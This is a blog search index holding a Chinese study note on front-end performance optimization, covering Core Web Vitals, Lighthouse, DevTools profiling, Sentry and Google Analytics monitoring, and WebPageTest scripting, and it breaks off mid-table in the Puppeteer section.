<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>前端性能优化知识专题学习</title>
    <link href="/2025/06/29/Performance%20Optimization/"/>
    <url>/2025/06/29/Performance%20Optimization/</url>
    
    <content type="html"><![CDATA[<h1 id="一、性能指标体系与监控"><a href="#一、性能指标体系与监控" class="headerlink" title="一、性能指标体系与监控"></a>一、性能指标体系与监控</h1><h2 id="1-1-核心性能指标-Web-Vitals"><a href="#1-1-核心性能指标-Web-Vitals" class="headerlink" title="1.1 核心性能指标 (Web Vitals)"></a>1.1 核心性能指标 (Web Vitals)</h2><h3 id="LCP-最大内容渲染时间"><a href="#LCP-最大内容渲染时间" class="headerlink" title="LCP (最大内容渲染时间)"></a>LCP (最大内容渲染时间)</h3><p><strong>LCP 核心定义</strong></p><ul><li>官方标准：<ul><li>测量 视口内最大文本&#x2F;图片元素 从页面开始加载到其渲染完成的时间</li><li>反映用户感知的主要内容可见性速度</li></ul></li><li>性能阈值（Chrome官方）:<ul><li>Good（优）：≤ 2.5 秒</li><li>Needs Improvement（需优化）：2.6 - 4.0 秒</li><li>Poor（差）：&gt; 4.0 秒</li></ul></li></ul><span id="more"></span><p><strong>LCP 计算规则</strong></p><ul><li>候选元素类型（按优先级）:<ul><li><code>&lt;img&gt;</code> 标签（含src或srcset）</li><li><code>&lt;image&gt;</code> 在 SVG 中的元素</li><li><code>&lt;video&gt;</code> 的封面图（poster属性）</li><li>通过 url() 加载背景图的块级元素</li><li>包含文本节点的块级元素（如<code>&lt;p&gt;、&lt;h1&gt;</code>）</li></ul></li><li>判定逻辑:<ul><li>取 视口内可见区域 面积最大的元素</li><li>若元素在渲染后被移除&#x2F;尺寸变化，取最终稳定状态</li></ul></li></ul><p><strong>影响 LCP 的关键因素</strong></p><table><thead><tr><th align="left">因素</th><th align="left">具体原因</th><th align="left">典型场景示例</th></tr></thead><tbody><tr><td align="left">资源加载延迟</td><td align="left">关键图片&#x2F;字体未优先加载</td><td align="left">未对首屏图片添加 preload</td></tr><tr><td align="left">服务端响应慢</td><td align="left">TTFB（首字节时间）过高</td><td align="left">未启用 CDN&#x2F;数据库查询慢</td></tr><tr><td align="left">渲染阻塞</td><td align="left">CSS&#x2F;JS 文件阻塞主线程</td><td align="left">未拆分关键 CSS&#x2F;未异步加载 JS</td></tr><tr><td align="left">布局偏移干扰</td><td align="left">动态插入内容导致最大元素变化</td><td align="left">广告位异步加载</td></tr></tbody></table><p><strong>LCP 优化手段</strong></p><p>(1) 资源优先级提升</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 预加载 LCP 图片 --&gt;<br>&lt;link rel=&quot;preload&quot; href=&quot;hero-image.webp&quot; as=&quot;image&quot;&gt;<br></code></pre></td></tr></table></figure><p>(2) 服务端加速</p><ul><li>采用 HTTP&#x2F;2 + TLS1.3</li><li>边缘缓存（CDN 静态资源）</li></ul><p>(3) 渲染关键路径优化</p><ul><li>内联关键 CSS（Critical CSS）</li><li>延迟非关键 JS（async&#x2F;defer）</li></ul><p>(4) 媒体资源针对性处理</p><ul><li>使用 <code>&lt;img loading=&quot;eager&quot;&gt;</code> 覆盖默认懒加载</li><li>响应式图片适配：srcset + sizes</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;img srcset=&quot;small.jpg 480w, medium.jpg 768w, large.jpg 1200w&quot;<br>     sizes=&quot;(max-width: 600px) 480px, 100vw&quot;<br>     src=&quot;fallback.jpg&quot; alt=&quot;Hero Image&quot;&gt;<br></code></pre></td></tr></table></figure><p><strong>LCP 测量工具</strong></p><ul><li>Chrome DevTools → Performance 面板（查看 Timings 中的 LCP 标记）</li></ul><p><strong>常见误区</strong></p><ul><li>错误认知<ul><li>❌ LCP 只关注图片 → ✅ 包含文本&#x2F;视频封面等任何最大元素</li><li>❌ 背景图一定计入 → ✅ 仅当元素为块级且尺寸明确时有效</li></ul></li><li>实践陷阱<ul><li>使用骨架屏（Skeleton Screen）可能延长 LCP（骨架屏本身可能被计为最大元素）</li><li>动态插入的广告&#x2F;Banner 若成为最大元素，其加载时间将主导 LCP</li></ul></li></ul><h3 id="FID-首次输入延迟-→-INP-Interaction-to-Next-Paint"><a href="#FID-首次输入延迟-→-INP-Interaction-to-Next-Paint" class="headerlink" title="FID (首次输入延迟) → INP (Interaction to Next Paint)"></a>FID (首次输入延迟) → INP (Interaction to Next Paint)</h3><p><strong>FID（首次输入延迟）核心概念</strong></p><p>定义：</p><ul><li>测量用户首次交互（点击&#x2F;触摸&#x2F;按键）到浏览器实际响应的时间差</li><li>量化页面可交互性的核心指标（反映主线程阻塞程度）</li></ul><p>性能阈值：</p><ul><li>Good（优）：≤ 100ms</li><li>Needs Improvement（需优化）：101 - 300ms</li><li>Poor（差）：&gt; 300ms</li></ul><p>关键局限：</p><ul><li>仅测量首次交互延迟</li><li>无法捕获页面生命周期中的持续交互体验</li></ul><p><strong>INP（下次绘制交互）取代 FID 的原因</strong></p><table><thead><tr><th align="left">维度</th><th align="left">FID (旧标准)</th><th align="left">INP (新标准)</th></tr></thead><tbody><tr><td align="left">测量范围</td><td align="left">仅首次交互</td><td align="left">所有关键交互（滚动&#x2F;点击&#x2F;输入）</td></tr><tr><td align="left">时间覆盖</td><td align="left">页面加载初期</td><td align="left">整个页面生命周期</td></tr><tr><td align="left">代表性</td><td align="left">部分场景失真</td><td align="left">更全面反映真实用户体验</td></tr><tr><td align="left">官方状态</td><td align="left">2023年起逐步淘汰</td><td align="left">Chrome官方推荐指标（2024年成为Core Web Vital）</td></tr></tbody></table><p><strong>INP 核心机制</strong></p><p>(1) 测量原理</p><pre class="mermaid">graph LRA[用户交互] --> B{事件触发}B --> C[输入延迟]C --> D[处理时间]D --> E[呈现延迟]E --> F[下次画面更新]</pre><ul><li>总耗时 &#x3D; 输入延迟 + 事件处理时间 + 呈现延迟</li></ul><p>(2) 性能阈值</p><ul><li>Good（优）：≤ 200ms</li><li>Needs Improvement（需优化）：201 - 500ms</li><li>Poor（差）：&gt; 500ms</li></ul><p>(3) 关键交互定义</p><ul><li>取所有交互事件中最慢的第98百分位值（排除长尾异常值）</li></ul><p><strong>影响 INP 的关键因素</strong></p><ul><li>长任务（Long Tasks）<ul><li>主线程阻塞 &gt; 50ms 的 JS 任务</li><li>典型场景：未优化的第三方脚本</li></ul></li><li>渲染效率低下<ul><li>复杂样式计算 &#x2F; 布局抖动（Layout Thrashing）</li><li>过度重绘（Repaint）</li></ul></li><li>内存压力<ul><li>频繁 GC（垃圾回收）导致暂停</li><li>内存泄漏积累</li></ul></li></ul><p><strong>INP 优化策略</strong></p><p>(1) 任务拆分</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 将长任务拆分为 &lt;50ms 的片段</span><br><span class="hljs-keyword">function</span> <span class="hljs-title function_">processChunk</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">if</span> (tasks.<span class="hljs-property">length</span>) &#123;<br>    <span class="hljs-keyword">const</span> start = performance.<span class="hljs-title function_">now</span>();<br>    <span class="hljs-keyword">while</span> (tasks.<span class="hljs-property">length</span> &amp;&amp; performance.<span class="hljs-title function_">now</span>() - start &lt; <span class="hljs-number">50</span>) &#123;<br>      <span class="hljs-title function_">executeTask</span>(tasks.<span class="hljs-title function_">shift</span>());<br>    &#125;<br>    <span class="hljs-built_in">setTimeout</span>(processChunk, <span class="hljs-number">0</span>); <span class="hljs-comment">// 让出主线程</span><br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2) 交互优先级调度</p><p>关键交互使用 scheduler.postTask() 高优先级:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-keyword">const</span> controller = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TaskController</span>(&#123; <span class="hljs-attr">priority</span>: <span class="hljs-string">&#x27;user-blocking&#x27;</span> &#125;);<br>scheduler.<span class="hljs-title function_">postTask</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-title function_">handleInput</span>(), &#123; <span class="hljs-attr">signal</span>: controller.<span class="hljs-property">signal</span> &#125;);<br></code></pre></td></tr></table></figure><p>(3) 减少呈现延迟</p><ul><li>避免强制同步布局（Forced Synchronous Layout）</li><li>使用 CSS content-visibility: auto 跳过离屏渲染</li></ul><p><strong>INP 测量方法</strong></p><ul><li>Chrome DevTools → Performance 面板（查看 Interaction to Next Paint 时间线）<ul><li>红色三角：交互开始</li><li>蓝色三角：下次绘制完成</li></ul></li></ul><h3 id="CLS-累积布局偏移"><a href="#CLS-累积布局偏移" class="headerlink" title="CLS (累积布局偏移)"></a>CLS (累积布局偏移)</h3><p><strong>CLS 核心定义</strong></p><ul><li>官方标准<ul><li>测量页面生命周期中意外布局偏移的累积分数</li><li>量化视觉稳定性（避免元素跳动导致误操作）</li></ul></li><li>计算规则<ul><li>CLS 分数 &#x3D; 影响比例 (impact fraction) × 距离比例 (distance fraction)</li><li>影响比例：偏移元素在视口内占据的面积百分比</li><li>距离比例：元素偏移距离 &#x2F; 视口最大尺寸（取宽或高中较大值）</li></ul></li><li>性能阈值<ul><li>Good（优）：≤ 0.1</li><li>Needs Improvement（需优化）：0.1 - 0.25</li><li>Poor（差）：&gt; 0.25</li></ul></li></ul><p><strong>布局偏移的触发条件</strong></p><ul><li>必要条件<ul><li>元素在两个连续帧间发生位置变化</li><li>变化原因非用户主动触发（如点击、滚动）</li></ul></li><li>常见场景：</li></ul><table><thead><tr><th align="left">类型</th><th align="left">典型案例</th></tr></thead><tbody><tr><td align="left">未定义尺寸元素</td><td align="left"><code>&lt;img&gt;/&lt;video&gt;</code> 未设 width&#x2F;height</td></tr><tr><td align="left">动态插入内容</td><td align="left">广告位&#x2F;通知横幅异步加载</td></tr><tr><td align="left">字体加载抖动</td><td align="left">FOIT&#x2F;FOUT（字体替换导致文本重排）</td></tr><tr><td align="left">异步更新 DOM</td><td align="left">无限滚动列表加载新项</td></tr></tbody></table><p><strong>CLS 优化实践</strong></p><p>(1) 媒体元素预留空间</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs HTML">&lt;!-- 指定宽高比容器防止图片加载后抖动 --&gt;<br>&lt;div style=&quot;position: relative; padding-top: 56.25%&quot;&gt; &lt;!-- 16:9 --&gt;<br>  &lt;img src=&quot;banner.jpg&quot; alt=&quot;Banner&quot; <br>       style=&quot;position: absolute; top: 0; left: 0; width: 100%; height: 100%&quot;&gt;<br>&lt;/div&gt;<br></code></pre></td></tr></table></figure><p>(2) 动态内容隔离策略</p><ul><li>为动态插入元素预留占位容器</li><li>使用 CSS transform 替代影响布局的属性（避免触发重排）</li></ul><p>(3) 字体加载控制</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs CSS"><span class="hljs-comment">/* 强制使用备用字体直至自定义字体加载 */</span><br><span class="hljs-keyword">@font-face</span> &#123;<br>  <span class="hljs-attribute">font-family</span>: <span class="hljs-string">&#x27;CustomFont&#x27;</span>;<br>  <span class="hljs-attribute">src</span>: <span class="hljs-built_in">url</span>(<span class="hljs-string">&#x27;font.woff2&#x27;</span>) <span class="hljs-built_in">format</span>(<span class="hljs-string">&#x27;woff2&#x27;</span>);<br>  <span class="hljs-attribute">font-display</span>: swap; <span class="hljs-comment">/* 关键选项 */</span><br>&#125;<br></code></pre></td></tr></table></figure><p>(4) 布局稳定性 API</p><ul><li>使用 CSS aspect-ratio 定义宽高比</li><li>优先采用 Flexbox&#x2F;Grid 布局（减少浮动偏移</li></ul><p><strong>CLS 测量方法</strong></p><ul><li>Chrome DevTools → Performance 面板（查看 Layout Shift 轨迹）</li></ul><p><strong>常见误区</strong></p><ul><li>错误认知<ul><li>❌ 所有元素偏移都计入 → ✅ 仅意外偏移（用户触发偏移不计）</li><li>❌ CLS 只关注首屏 → ✅ 覆盖页面完整生命周期</li></ul></li><li>实践陷阱<ul><li>使用 position: fixed 的头部导航栏若动态改变高度（如登录条出现）将导致下方内容集体偏移</li><li>懒加载图片未设置 width&#x2F;height 时，滚动加载会触发连锁布局重排</li></ul></li></ul><h2 id="1-2-性能监控工具"><a href="#1-2-性能监控工具" class="headerlink" title="1.2 性能监控工具"></a>1.2 性能监控工具</h2><h3 id="Lighthouse-PageSpeed-Insights"><a href="#Lighthouse-PageSpeed-Insights" class="headerlink" title="Lighthouse &#x2F; PageSpeed Insights"></a>Lighthouse &#x2F; PageSpeed Insights</h3><p><strong>核心定位与差异</strong></p><table><thead><tr><th align="left">维度</th><th align="left">Lighthouse</th><th align="left">PageSpeed Insights (PSI)</th></tr></thead><tbody><tr><td align="left">运行环境</td><td align="left">本地（Node.js&#x2F;DevTools）</td><td align="left">Google服务器（云端测试）</td></tr><tr><td align="left">测试设备模拟</td><td align="left">可自定义设备&#x2F;网络参数</td><td align="left">固定移动端+桌面端（不可调参数）</td></tr><tr><td align="left">数据源</td><td align="left">实验室数据（Lab Data）</td><td align="left">实验室数据 + 部分真实用户数据（CrUX）</td></tr><tr><td align="left">报告深度</td><td align="left">原始跟踪数据可深度分析</td><td align="left">聚合结果（无Performance面板级细粒度数据）</td></tr></tbody></table><p><strong>核心功能解析</strong></p><ul><li>性能指标测量<ul><li>直接输出 Web Vitals 三项指标（LCP, FID&#x2F;INP, CLS）</li><li>提供性能评分（0-100分）及改进建议</li></ul></li><li>优化建议系统<ul><li>按优先级列出可优化项（高&#x2F;中&#x2F;低影响）</li><li>附带可操作代码示例（如未压缩图片列表）</li></ul></li><li>技术栈分析<ul><li>自动检测框架（React&#x2F;Vue等）</li><li>识别第三方脚本影响（广告&#x2F;分析工具）</li></ul></li></ul><p><strong>Lighthouse 高阶用法</strong></p><p>(1) Node CLI 自定义测试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">lighthouse https://example.com --output=json --emulated-form-factor=mobile --throttling.cpuSlowdownMultiplier=4<br></code></pre></td></tr></table></figure><ul><li>–preset（性能预设：perf|desktop）</li><li>–throttling（自定义网络&#x2F;CPU限流）</li><li>–only-categories（指定测试类目：performance|accessibility）</li></ul><p>(2) DevTools 深度分析</p><ul><li>查看 Performance 面板原始跟踪（Main主线程火焰图）</li><li>Coverage 标签页定位未使用JS&#x2F;CSS（红条标记可删代码）</li></ul><p><strong>报告解读技巧</strong></p><p>(1) 关键指标优先级</p><pre class="mermaid">graph TDA[性能评分] --> B[Web Vitals]B --> B1(LCP)B --> B2(FID/INP)B --> B3(CLS)A --> C[优化建议]C --> C1(Opportunities)C --> C2(Diagnostics)</pre><p>(2) 核心优化建议分类</p><table><thead><tr><th align="left">类别</th><th align="left">典型案例</th><th align="left">修复收益</th></tr></thead><tbody><tr><td align="left">Opportunities</td><td align="left">移除未用CSS&#x2F;图片压缩</td><td align="left">★★★</td></tr><tr><td align="left">Diagnostics</td><td align="left">最小化主线程工作&#x2F;避免DOM过大</td><td align="left">★★</td></tr><tr><td align="left">Passed Audits</td><td align="left">已优化的最佳实践</td><td align="left">-</td></tr></tbody></table><h3 id="Chrome-DevTools-Performance面板深度使用"><a href="#Chrome-DevTools-Performance面板深度使用" class="headerlink" title="Chrome DevTools Performance面板深度使用"></a>Chrome DevTools Performance面板深度使用</h3><p><strong>核心功能定位</strong></p><ul><li>核心价值<ul><li>可视化分析页面运行时性能瓶颈（非加载阶段）</li><li>提供毫秒级主线程活动追踪（JS执行&#x2F;渲染&#x2F;网络）</li></ul></li><li>与Lighthouse差异：</li></ul><table><thead><tr><th align="left">维度</th><th align="left">Performance 面板</th><th align="left">Lighthouse</th></tr></thead><tbody><tr><td align="left">分析类型</td><td align="left">运行时动态追踪</td><td align="left">静态规则审计</td></tr><tr><td align="left">数据粒度</td><td align="left">毫秒级函数调用栈</td><td align="left">聚合指标评分</td></tr><tr><td align="left">适用场景</td><td align="left">诊断卡顿&#x2F;内存泄漏</td><td align="left">整体优化建议</td></tr></tbody></table><p><strong>操作全流程解析</strong></p><ul><li>录制准备<ul><li>开启 Screenshots（帧截图）捕捉视觉变化</li><li>启用 Advanced settings → Web Vitals 标记关键指标</li></ul></li></ul><pre class="mermaid">graph LRA[点击Record开始录制] --> B[执行用户操作]B --> C[停止录制]C --> D[分析火焰图]</pre><ul><li>关键控制项<ul><li>CPU Throttling：模拟移动端CPU（推荐4x降速）</li><li>Network Throttling：模拟慢网络（推荐Fast 3G）</li><li>Enable advanced paint instrumentation：分析图层绘制</li></ul></li></ul><p><strong>报告结构深度解读</strong></p><p>(1) 时间线概览（Overview）</p><table><thead><tr><th align="left">区域</th><th align="left">分析维度</th><th align="left">关键信息</th></tr></thead><tbody><tr><td align="left">FPS</td><td align="left">帧率波动</td><td align="left">红色块&#x3D;掉帧（&lt;50fps）</td></tr><tr><td align="left">CPU</td><td align="left">处理器负载分配</td><td align="left">颜色&#x3D;JS&#x2F;渲染&#x2F;其他</td></tr><tr><td align="left">NET</td><td align="left">网络请求瀑布流</td><td align="left">条形长度&#x3D;请求耗时</td></tr></tbody></table><p>(2) 主程火焰图</p><ul><li>横向：时间轴（毫秒级）</li><li>纵向：调用栈深度（函数嵌套关系）</li><li>关键标识：<ul><li>红色三角：长任务（&gt;50ms）</li><li>黄色块：JavaScript执行</li><li>紫色块：布局计算（Layout）</li></ul></li></ul><p><strong>性能瓶颈诊断技巧</strong></p><ul><li>长任务溯源<ul><li>展开火焰图中超过50ms的任务块</li><li>定位耗时最长的函数调用（底部最深色块）</li></ul></li><li>布局抖动分析<ul><li>查找连续出现的 Layout 紫色块</li><li>检查触发源（通常由JS强制同步布局导致）：</li></ul></li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 反例：触发强制布局</span><br><span class="hljs-keyword">const</span> width = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// 读取</span><br>element.<span class="hljs-property">style</span>.<span class="hljs-property">width</span> = width + <span class="hljs-number">10</span> + <span class="hljs-string">&#x27;px&#x27;</span>; <span class="hljs-comment">// 写入</span><br><span class="hljs-keyword">const</span> newWidth = element.<span class="hljs-property">offsetWidth</span>; <span class="hljs-comment">// 再次读取 → 布局抖动！</span><br></code></pre></td></tr></table></figure><ul><li>渲染层优化：切换 Layers 标签页：<ul><li>检查图层数量（过多&#x3D;内存占用高）</li><li>定位 Repaint 高频区域（红色高亮）</li></ul></li></ul><p><strong>高级功能应用</strong></p><ul><li>性能监控点（Performance Monitor）<ul><li>实时跟踪关键指标：<ul><li>JS堆内存大小</li><li>DOM节点数量</li><li>事件监听器数量</li></ul></li><li>诊断内存泄漏：内存曲线持续上升</li></ul></li><li>渲染分析（Rendering）<ul><li>启用 Paint flashing：绿色闪烁&#x3D;重绘区域</li><li>开启 Layout Shift Regions：蓝色覆盖&#x3D;布局偏移区域</li></ul></li><li>代码级优化定位<ul><li>右击火焰图块 → Reveal in Source panel</li><li>查看函数源码及执行耗时（精确到行）</li></ul></li></ul><p><strong>实战调试案例</strong></p><p>场景：按钮点击卡顿</p><ul><li>录制点击操作</li><li>分析火焰图：<ul><li>发现 Event: click 下200ms长任务</li><li>展开定位到 processData() 函数耗时180ms</li></ul></li><li>优化方案：</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 优化前（同步阻塞）</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-title function_">processData</span>(); <span class="hljs-comment">// 200ms任务</span><br>&#125;);<br><br><span class="hljs-comment">// 优化后（任务拆分）</span><br>button.<span class="hljs-title function_">addEventListener</span>(<span class="hljs-string">&#x27;click&#x27;</span>, <span class="hljs-function">() =&gt;</span> &#123;<br>  <span class="hljs-built_in">setTimeout</span>(processData, <span class="hljs-number">0</span>); <span class="hljs-comment">// 拆解任务</span><br>&#125;);<br></code></pre></td></tr></table></figure><h3 id="RUM-Real-User-Monitoring-方案：Sentry-Google-Analytics"><a href="#RUM-Real-User-Monitoring-方案：Sentry-Google-Analytics" class="headerlink" title="RUM (Real User Monitoring) 方案：Sentry &#x2F; Google Analytics"></a>RUM (Real User Monitoring) 方案：Sentry &#x2F; Google Analytics</h3><p><strong>RUM 核心定义与价值</strong></p><ul><li>基本概念<ul><li>RUM 通过嵌入前端代码（如 JavaScript SDK）收集真实用户访问时的性能数据、交互行为及错误信息。</li><li>与合成监控（Synthetic Monitoring）的区别：真实用户数据（非模拟环境）覆盖多设备、多网络条件场景。</li></ul></li><li>核心价值<ul><li>性能优化：定位真实环境中的性能瓶颈（如慢加载、高延迟）。</li><li>错误诊断：捕获生产环境中的 JavaScript 错误及资源加载失败。</li><li>行为分析：追踪用户点击路径、页面停留时长，关联业务转化率</li></ul></li></ul><p><strong>Sentry：深度错误诊断方案</strong></p><p>核心功能：</p><table><thead><tr><th align="left">功能类别</th><th align="left">具体能力</th></tr></thead><tbody><tr><td align="left">错误追踪</td><td align="left">- 自动捕获未处理的 JavaScript 异常、Promise 拒绝、资源加载失败 <br> - 支持源码映射（Sourcemap）定位压缩代码的错误行</td></tr><tr><td align="left">会话重放</td><td align="left">录制用户操作序列，重现错误发生前的行为路径（需付费版）</td></tr><tr><td align="left">性能监控</td><td align="left">- 测量页面加载时间、API 请求延迟<br> - 关联错误与性能慢请求（如高延迟触发的超时错误）</td></tr><tr><td align="left">自定义上下文</td><td align="left">添加用户信息、环境变量等辅助诊断的标签（如 user.id、release.version）</td></tr></tbody></table><p>实施示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// Sentry 初始化（Web SDK）</span><br><span class="hljs-keyword">import</span> * <span class="hljs-keyword">as</span> <span class="hljs-title class_">Sentry</span> <span class="hljs-keyword">from</span> <span class="hljs-string">&quot;@sentry/browser&quot;</span>;<br><span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">init</span>(&#123;<br>  <span class="hljs-attr">dsn</span>: <span class="hljs-string">&quot;https://example@sentry.io/123&quot;</span>,<br>  <span class="hljs-attr">release</span>: <span class="hljs-string">&quot;my-app@1.0.0&quot;</span>,<br>  <span class="hljs-attr">integrations</span>: [<span class="hljs-keyword">new</span> <span class="hljs-title class_">Sentry</span>.<span class="hljs-title class_">BrowserTracing</span>()],<br>  <span class="hljs-attr">tracesSampleRate</span>: <span class="hljs-number">0.2</span>, <span class="hljs-comment">// 性能数据采样率</span><br>&#125;);<br><br><span class="hljs-comment">// 手动捕获错误</span><br><span class="hljs-title class_">Sentry</span>.<span class="hljs-title function_">captureException</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Error</span>(<span class="hljs-string">&quot;Custom error&quot;</span>));<br></code></pre></td></tr></table></figure><p><strong>Google Analytics：行为与性能分析方案</strong></p><p>核心功能：</p><table><thead><tr><th align="left">功能类别</th><th align="left">具体能力</th></tr></thead><tbody><tr><td align="left">用户行为分析</td><td align="left">- 页面浏览量（PV）、会话时长、跳出率统计 <br> - 事件跟踪（点击、表单提交等自定义事件）</td></tr><tr><td align="left">性能指标</td><td align="left">通过 web-vitals 库集成 LCP&#x2F;FID&#x2F;CLS 等 Core Web Vitals 指标</td></tr><tr><td align="left">用户分群</td><td align="left">按设备、地域、流量来源细分性能数据（如“移动端用户 LCP &gt; 4s 占比”）</td></tr><tr><td align="left">转化漏斗</td><td align="left">定义多步骤业务流程（如注册流程），分析各环节流失率</td></tr></tbody></table><p>实施示例：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs JavaScript"><span class="hljs-comment">// 通过 gtag.js 上报 Web Vitals</span><br><span class="hljs-keyword">import</span> &#123;getLCP, getFID, getCLS&#125; <span class="hljs-keyword">from</span> <span class="hljs-string">&#x27;web-vitals&#x27;</span>;<br><span class="hljs-title function_">getLCP</span>(<span class="hljs-function"><span class="hljs-params">metric</span> =&gt;</span> <span class="hljs-title function_">gtag</span>(<span class="hljs-string">&#x27;event&#x27;</span>, <span class="hljs-string">&#x27;LCP&#x27;</span>, &#123;<span class="hljs-attr">value</span>: metric.<span class="hljs-property">value</span>&#125;));<br></code></pre></td></tr></table></figure><p><strong>Sentry vs Google Analytics 关键对比</strong></p><table><thead><tr><th align="left">维度</th><th align="left">Sentry</th><th align="left">Google Analytics</th></tr></thead><tbody><tr><td align="left">核心定位</td><td align="left">错误诊断与根因分析</td><td align="left">用户行为分析与流量转化</td></tr><tr><td align="left">性能监控深度</td><td align="left">支持代码级错误定位 + 性能链路追踪</td><td align="left">仅提供聚合指标（无堆栈跟踪）</td></tr><tr><td align="left">自定义扩展</td><td align="left">支持自定义标签、事件、采样策略</td><td align="left">依赖 gtag 事件API，灵活性较低</td></tr><tr><td align="left">数据实时性</td><td align="left">错误报警分钟级推送</td><td align="left">数据延迟 24-48 小时</td></tr><tr><td align="left">成本模型</td><td align="left">按事件量收费（免费版有限额）</td><td align="left">完全免费（GA4 标准版）</td></tr><tr><td align="left">集成生态</td><td align="left">支持 Jira&#x2F;Slack 等 DevOps 工具链</td><td align="left">主要与 Google 生态（Ads&#x2F; BigQuery）集成</td></tr></tbody></table><h3 id="Synthetic-Monitoring-合成监控-：WebPageTest-Puppeteer"><a href="#Synthetic-Monitoring-合成监控-：WebPageTest-Puppeteer" class="headerlink" title="Synthetic Monitoring (合成监控)：WebPageTest &#x2F; Puppeteer"></a>Synthetic Monitoring (合成监控)：WebPageTest &#x2F; Puppeteer</h3><p><strong>合成监控核心概念</strong></p><ul><li>定义与价值<ul><li>在预设环境中通过脚本模拟用户操作路径（如页面导航、点击）</li><li>与 RUM 互补：提供稳定可复现的基准测试，排除用户设备&#x2F;网络差异</li></ul></li><li>核心应用场景<ul><li>版本发布前性能回归测试</li><li>竞品性能对标分析</li><li>CDN 节点选择优化（全球多地点测试）</li></ul></li></ul><p><strong>WebPageTest：云端自动化测试平台</strong></p><p>核心功能解析：</p><table><thead><tr><th align="left">功能维度</th><th align="left">技术实现</th></tr></thead><tbody><tr><td align="left">多地点测试</td><td align="left">支持全球 40+ 测试节点（AWS EC2 实例）</td></tr><tr><td align="left">网络模拟</td><td align="left">自定义带宽&#x2F;延迟（DSL&#x2F;Cable&#x2F;4G）或精确丢包率设置</td></tr><tr><td align="left">高级捕获</td><td align="left">视频录制、Traceroute 诊断、HTTP&#x2F;2 优先级可视化</td></tr><tr><td align="left">脚本扩展</td><td align="left">通过 navigate&#x2F;clickAndWait 等命令模拟用户流（支持登录等复杂操作）</td></tr></tbody></table><p>关键测试指标：</p><pre class="mermaid">graph LRA[WebPageTest报告] --> B[核心性能指标]A --> C[资源瀑布流]A --> D[优化建议]B --> B1(LCP)B --> B2(TTFB)B --> B3(Speed Index)C --> C1(资源加载时序)C --> C2(CDN命中状态)D --> D1(压缩建议)D --> D2(缓存策略)</pre><p><strong>实战工作流</strong></p><p>(1) 测试配置</p><ul><li>选择测试地点（如 ec2-us-east-1）</li><li>设置网络节流（如 4G: 20ms RTT, 20Mbps）</li><li>添加自定义脚本：</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs Text">navigate https://example.com<br>execAndWait document.querySelector(&#x27;#login&#x27;).click()<br>setValue input[name=user] test@email.com<br>setValue input[name=pass] 123456<br>submitForm id=login-form<br></code></pre></td></tr></table></figure><p>(2) 报告解读技巧</p><ul><li>Speed Index &lt; 3.5s 为良好（反映视觉完成速度）</li><li>Waterfall 红色竖线标记 DOMContentLoaded 时间点</li><li>Connection View 诊断 HTTP&#x2F;2 多路复用效果</li></ul><p><strong>Puppeteer：代码级精准控制方案</strong></p><p>核心功能解析：</p><table><thead><tr><th align="left">能力类别</th><th align="left">API 示例</th><th align="left">监控用途</th></tr></thead><tbody><tr><td align="left">浏览器控制</td><td align="left">puppeteer.launch()</td><td align="left">多环境测试（Headless&#x2F;Headful）</td></tr><tr><td align="left">用户行为模拟</td><td align="left">page.click(‘#button’)</td><td align="left">交互性能分析</td></tr><tr><td align="left">性能数据捕获</td><td 